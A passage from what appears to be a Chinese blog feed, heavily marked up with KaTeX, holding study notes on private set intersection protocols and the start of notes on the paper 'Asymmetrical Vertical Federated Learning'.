style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，Receiver比对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k_i,x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>  和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k_i,y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717193441069.png" alt></p><hr><ul><li><p>Hiding：基于OPRF（通过秘密函数OPRF，使得Sender不知道Receiver的数据，而Receiver不知道秘密函数构造）</p></li><li><p>Comparing；比较数据经过秘密函数输出的结果</p></li><li><p>Efficiency：高计算量、高通信量（本地比较和通信都是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>）</p></li></ul><p>可通过<code>Cuckoo Hashing + OPRF</code>构造PSI（KKRT PSI Protocol），实现<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 规模的OPRF和本地比较</p><h1 id="PSI需求与应用">PSI需求与应用</h1><p>除了常见的白/黑名单，撞库等，还有……</p><h2 id="交集使用">交集使用</h2><p>动机：<strong>交集可能并不是PSI参与方间的常识（交集中的数据可能属于其他人）</strong>。比如：Alice使用相同ID在银行A和银行B都注册了信息，但是银行A和B不能通过PSI泄露Alice的联合明文信息。</p><p>挑战：交集“可用不可见”（PSI输出不能是直接的全部明文）</p><p>用法：</p><ol><li>交集保密，基数（cardinality）只能向认证方泄露</li><li>交集保密，但PSI的秘密输出支持后续安全计算</li><li>交集保密，但是<em>需要习惯（but still need to get used，啥意思，看不懂）</em>，比如来联合广告营销</li></ol><h2 id="多方PSI">多方PSI</h2><ul><li><strong>常规多方PSI</strong></li></ul><p>动机：需要N参与方的交集</p><p>挑战：任意两方间的交集不能被泄露</p><p>方法：1、PHE+<code>多项式表示（Polynomial representation）</code> ; 2、OPPRF</p><ul><li><strong>特殊多方PSI</strong></li></ul><p>动机：需要计算一些两方间交集，交集结果会泄露给特殊的一些参与方</p><p>挑战：需求需要视情况而定，需要客制化的解决方案</p><p>方法：常规的PSI协议加上客制化</p><h2 id="计算模型">计算模型</h2><ul><li><p><strong>单向模型（One-way Model）</strong></p><p>动机：只<strong>有一方应当知道交集</strong>。比如，客户端向一个新的社交媒体服务提交联系人列表，客户端应该知交集，而服务器应当对客户端的数据一无所知（或只知道输入数据大小）。</p></li><li><p><strong>共有模型（Mutual Model）</strong></p><p>动机：两方都应当知道交集。比如，寻找两个银行的共有客户。</p></li><li><p><strong>外包PSI（Outsourced/Delegated/Server-Aided PSI）</strong></p><p>两个客户端<strong>在不可信第三方的帮助下</strong>在他们的外包数据上完成PSI计算。</p><p>动机：参与方无法完成PSI计算，比如参与方只拥有资源受限的设备</p><p>挑战：第三方只参与计算，但不应当获得最终结果（即使是cardinality这样的数据）</p></li></ul><h2 id="安全模型">安全模型</h2><ul><li><p><strong>诚实-好奇模型安全PSI（Semi-Honest Secure PSI）</strong></p><p>动机：简单高效（目前大多数PSI协议都是在诚实-好奇的假设下实现的）</p><p>挑战：安全假设太强，只考虑了被动（passive）敌手</p><p>方法：基于DH、OPRF等的PSI</p></li><li><p><strong>恶意模型安全PSI（Malicious Secure PSI)</strong></p><p>动机：是更符合现实的，更进一步的安全假设，考虑恶意敌手</p><p>挑战：更多的计算和通信开销</p><p>方法：基于额外身份验证的 PSI 协议等</p></li></ul><h2 id="非对称PSI">非对称PSI</h2><p>动机：一方拥有元素的数量比另一方大得多（弱方拥有的大部分元素可能都在交集中出现）</p><p>方法：1、ECC-OPRF-PSI；2、FHE PSI</p><h2 id="其他特殊需求">其他特殊需求</h2><ul><li>Size-hiding</li><li>Business scenario with customized requirements</li></ul><h1 id="PSI最新进展">PSI最新进展</h1><ul><li>优化离线阶段<ul><li>使用最新的<code>OT</code>技术</li><li>使用<code>VOLE</code>替换OT</li></ul></li><li>使用新的原语（primitives）替换Cuckoo Hashing<ul><li>引入<code>字符串的探测和异或（Probe-and-Xor-of-Strings(PaXos)）</code></li><li>引入<code>不经意的键值对存储（Oblivious Key-Value Store (OKVS)）</code></li></ul></li><li>支持在交集上进行后续的安全计算</li><li>亿级计算：高带宽 + 高算力，分钟级别完成</li></ul>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
          <category> 隐私保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐私计算 </tag>
            
            <tag> PSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Asymmetrical Vertical Federated Learning》阅读笔记</title>
      <link href="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>论文：<a href="https://arxiv.org/abs/2004.07427"> Y, Zhang X, Wang L. Asymmetrical vertical federated learning[J]. arXiv preprint arXiv:2004.07427, 2020.</a></p><p>在联邦学习中，通常会使用基于ID的样本对齐方法，但却很少关注保护ID的隐私。为了缓解对于ID隐私的担忧，本文正式提出<strong>非对称纵向联邦学习</strong>的概念，并且阐述了保护样本ID的方法。<br>标准的隐私求交通常在非对称纵向联邦学习的样本对齐阶段被采用，本文相应的提出了一种 <strong>Pohlig-Hellman 实现机制</strong>。本文还提出了一种 <strong>真正的虚拟(genuine with dummy)</strong> 方法来实现非对称联邦学习训练。</p><span id="more"></span><h1 id="Introduction">Introduction</h1><p>在联邦学习中，尤其是在纵向场景中，在利用ID对齐分布数据集后，忽略样本的D信息泄露是常见但是不合理的。实际应用中，参与方通常是具有&quot;页面没有找到&quot;司或者机构，因此，一方面，参与者不允许披露它们的样本ID；另一方面，现实生活中存在着<strong>不对称的联邦，其中一部分参与者是对ID隐私要求很高的小公司，而另一部分是对ID隐私不太关心的大公司</strong>(交集一旦公布，小公司的ID隐私泄露很严重，考虑极端情况，甚至会完全泄露)。这种不平衡的设置需要一个纵向联邦学习系统来区分联邦的”强“和“弱”侧，并且考虑到他们特定的隐私保护需求。</p><p>本文将纵向联邦学习分为<code>对称型</code>和<code>非对称型</code>，以便设计保护ID的联邦学习算法。本文的贡献包括：</p><ol><li><p>提出非对称纵向联邦学习的概念。</p></li><li><p>吸收标准隐私求交协议以在非对称联邦学习系统中实现非对称ID对齐。此外，我们提供一种Pohlig-Hellman的适配隐私求交的实现。</p></li><li><p>我们提出了一种真正的虚拟方法以实现不对称的联邦模型训练。为了展示其应用，提供联邦逻辑回归算法作为例子。</p></li></ol><h1 id="Problem-Definition">Problem Definition</h1><h2 id="Vertical-Federated-Learning">Vertical Federated Learning</h2><p>使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">D</mi><mo>=</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="script">I</mi><mo separator="true">,</mo><mi mathvariant="script">X</mi><mo separator="true">,</mo><mi mathvariant="script">Y</mi></mrow><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}=(\mathcal{I,X,Y})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span><span class="mclose">)</span></span></span></span> 表示1个完整的数据集，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">D</mi><mo separator="true">,</mo><mi mathvariant="script">X</mi><mo separator="true">,</mo><mi mathvariant="script">Y</mi></mrow><annotation encoding="application/x-tex">\mathcal{D,X,Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span></span></span></span> 分别表示样本ID空间、特征空间和标签空间。纵向联邦学习被定义为在2个数据集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">D</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}_1=(\mathcal{I}_1,\mathcal{X}_1,\mathcal{Y}_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">D</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}_2=(\mathcal{I}_2,\mathcal{X}_2,\mathcal{Y}_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 上，这2个数据集满足：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="script">X</mi><mn>1</mn></msub><mo mathvariant="normal">≠</mo><msub><mi mathvariant="script">X</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>1</mn></msub><mo mathvariant="normal">≠</mo><msub><mi mathvariant="script">Y</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{X}_{1} \neq \mathcal{X}_{2}, \mathcal{Y}_{1} \neq \mathcal{Y}_{2}, \mathcal{I}_{1}=\mathcal{I}_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>然而在现实应用中，几乎无法找到2个共享相同ID空间的数据集。因此，在纵向联邦学习的预处理阶段有必要引入<code>ID对齐（ID-alignment）</code>协议，以帮助各方安全识别交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 并建立两个数据集的行映射。</p><p>我们定义 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">D</mi><mn>1</mn><mi>o</mi></msubsup><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><mtext>，</mtext><msubsup><mi mathvariant="script">D</mi><mn>2</mn><mi>o</mi></msubsup><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathcal{D}_{1}^{o}=\left(\mathcal{I}_{1}^{o}, \mathcal{X}_{1}, \mathcal{Y}_{1}\right)，\mathcal{D}_{2}^{o}=\left(\mathcal{I}_{2}^{o}, \mathcal{X}_{2}, \mathcal{Y}_{2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 